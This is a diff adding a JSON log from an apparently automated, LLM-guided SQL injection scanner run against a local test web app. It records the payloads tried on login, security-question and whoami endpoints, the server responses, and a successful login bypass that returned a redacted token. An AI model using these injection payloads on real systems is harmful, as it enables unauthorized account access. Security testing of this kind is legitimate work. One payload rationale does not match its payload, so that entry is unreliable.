+            "reason": "Endpoint is a login form with email and password fields, suggesting an authentication lookup",
+            "starting_strategy": "auth_boolean_bypass"
+          },
+          "payload_count": 1,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": "' OR '' = '' --",
+              "payload_rationale": "Repair the previous payload rejection by adding a single quote and a line comment marker.",
+              "expected_signal": "SQL parser error or auth probe success",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 401,
+                "elapsed_ms": 2073,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 26,
+                "body_sample": "Invalid email or password."
+              },
+              "probe": {
+                "status_code": 200,
+                "elapsed_ms": 2088,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 799,
+                "body_sample": "{\"authentication\":{\"token\":\"[REDACTED]\",\"bid\":1,\"umail\":\"[REDACTED_EMAIL]\"}}"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 401,
+                "probe_status": 200,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 773,
+                "body_changed": true,
+                "elapsed_delta_ms": 15,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
+                "auth_bypass_like": true
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Baseline failed authorization/authentication, while probe succeeded.",
+                "next_step": "Stop; authentication-bypass evidence is sufficient."
+              }
+            }
+          ],
+          "final_decision": "escalate",
+          "strongest_decision": "escalate",
+          "stop_reason": "Stopped after sufficient authentication-bypass evidence."
+        },
+        {
+          "name": "password",
+          "in": "json",
+          "endpoint_context": {
+            "endpoint_type": "auth_login",
+            "resource": "User Login",
+            "likely_sql_context": "auth_lookup",
+            "recommended_attack_style": "auth_boolean_bypass",
+            "avoid_payload_styles": [
+              "union_enum",
+              "auth_bypass",
+              "numeric_probe"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.9,
+            "reason": "Endpoint is a login form with email and password fields, suggesting an authentication lookup"
+          },
+          "suitability": {
+            "probe": false,
+            "confidence": 0.9,
+            "reason": "Skipped password field because an identity field is available for authentication-query testing.",
+            "starting_strategy": "skip_identity_field_preferred"
+          },
+          "payload_count": 0,
+          "attempts": [],
+          "final_decision": "stop",
+          "strongest_decision": "stop",
+          "stop_reason": "Skipped by suitability gate: Skipped password field because an identity field is available for authentication-query testing."
+        }
+      ]
+    },
+    {
+      "method": "GET",
+      "path": "/rest/user/security-question",
+      "url": "http://127.0.0.1:8080/rest/user/security-question",
+      "endpoint_context": {
+        "endpoint_type": "other_data_endpoint",
+        "resource": "User Security Question",
+        "likely_sql_context": "auth_lookup",
+        "recommended_attack_style": "auth_boolean_bypass",
+        "avoid_payload_styles": [
+          "union_enum",
+          "auth_bypass"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.9,
+        "reason": "Endpoint is used to retrieve user security question, likely using email as a lookup parameter."
+      },
+      "params": [
+        {
+          "name": "email",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "other_data_endpoint",
+            "resource": "User Security Question",
+            "likely_sql_context": "auth_lookup",
+            "recommended_attack_style": "auth_boolean_bypass",
+            "avoid_payload_styles": [
+              "union_enum",
+              "auth_bypass"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.9,
+            "reason": "Endpoint is used to retrieve user security question, likely using email as a lookup parameter."
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.9,
+            "reason": "Endpoint is used to retrieve user security question, likely using email as a lookup parameter.",
+            "starting_strategy": "auth_boolean_bypass"
+          },
+          "payload_count": 1,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": "' OR ' = '",
+              "payload_rationale": "Boolean bypass probe to test for SQLi vulnerability",
+              "expected_signal": "SQL parser error or unexpected response",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2099,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 2,
+                "body_sample": "{}"
+              },
+              "probe": {
+                "status_code": 200,
+                "elapsed_ms": 2085,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 2,
+                "body_sample": "{}"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 200,
+                "status_changed": false,
+                "content_type_changed": false,
+                "body_length_delta": 0,
+                "body_changed": false,
+                "elapsed_delta_ms": -14,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 0.0,
+                "reason": "Baseline and probe are effectively identical and there is no SQL error, auth bypass, timing, content-type, or meaningful body change.",
+                "next_step": "Try another payload or gather more context."
+              }
+            }
+          ],
+          "final_decision": "stop",
+          "strongest_decision": "stop",
+          "stop_reason": "Baseline and probe are effectively identical and there is no SQL error, auth bypass, timing, content-type, or meaningful body change."
+        }
+      ]
+    },
+    {
+      "method": "GET",
+      "path": "/rest/user/whoami",
+      "url": "http://127.0.0.1:8080/rest/user/whoami",
+      "endpoint_context": {
+        "endpoint_type": "lookup_by_id",
+        "resource": "User information",
+        "likely_sql_context": "id_lookup",
+        "recommended_attack_style": "numeric_identifier_probe",
+        "avoid_payload_styles": [
+          "union_enum",
+          "auth_bypass"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.8,
+        "reason": "The endpoint is a GET request to retrieve user information by ID, suggesting a numeric identifier probe is the most suitable attack style."
+      },
+      "params": [
+        {
+          "name": "fields",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "lookup_by_id",
+            "resource": "User information",
+            "likely_sql_context": "id_lookup",
+            "recommended_attack_style": "numeric_identifier_probe",
+            "avoid_payload_styles": [
+              "union_enum",
+              "auth_bypass"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.8,
+            "reason": "The endpoint is a GET request to retrieve user information by ID, suggesting a numeric identifier probe is the most suitable attack style."
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.8,
+            "reason": "The endpoint is a GET request to retrieve user information by ID, suggesting a numeric identifier probe is the most suitable attack style.",
+            "starting_strategy": "numeric_identifier_probe"
+          },
+          "payload_count": 2,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": "1' OR 1=1 --",
+              "payload_rationale": "numeric identifier probe with boolean confirmation",
+              "expected_signal": "SQL parser error or unexpected response",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2082,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 11,
+                "body_sample": "{\"user\":{}}"
+              },
+              "probe": {
+                "status_code": 200,
+                "elapsed_ms": 2082,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 11,
+                "body_sample": "{\"user\":{}}"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 200,
+                "status_changed": false,
+                "content_type_changed": false,
+                "body_length_delta": 0,
+                "body_changed": false,
+                "elapsed_delta_ms": 0,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "not_decidable",
+                "confidence": 0.5,
+                "reason": "Baseline and probe are effectively identical and there is no SQL error, auth bypass, timing, content-type, or meaningful body change.",
+                "next_step": "Try another payload or gather more context."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": "1 OR 1=1",
+              "payload_rationale": "Deliberately mismatched parentheses to force a SQL parser error.",
+              "expected_signal": "SQL parser error with mismatched parentheses",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2071,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 11,
+                "body_sample": "{\"user\":{}}"
+              },
+              "probe": {
+                "status_code": 200,
+                "elapsed_ms": 2069,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 11,
+                "body_sample": "{\"user\":{}}"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 200,
+                "status_changed": false,
+                "content_type_changed": false,
+                "body_length_delta": 0,
+                "body_changed": false,
+                "elapsed_delta_ms": -2,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "not_decidable",
+                "confidence": 0.5,
+                "reason": "Baseline and probe are effectively identical and there is no SQL error, auth bypass, timing, content-type, or meaningful body change.",
+                "next_step": "Try another payload or gather more context."
+              }
+            }
+          ],
+          "final_decision": "not_decidable",
+          "strongest_decision": "not_decidable",
+          "stop_reason": "Stopped because the response matched baseline closely; there was no useful error or behavior signal to adapt from."
+        }
+      ]
+    }
+  ],
+  "finished_at": "2026-06-25T17:38:28.861298+00:00"
+}
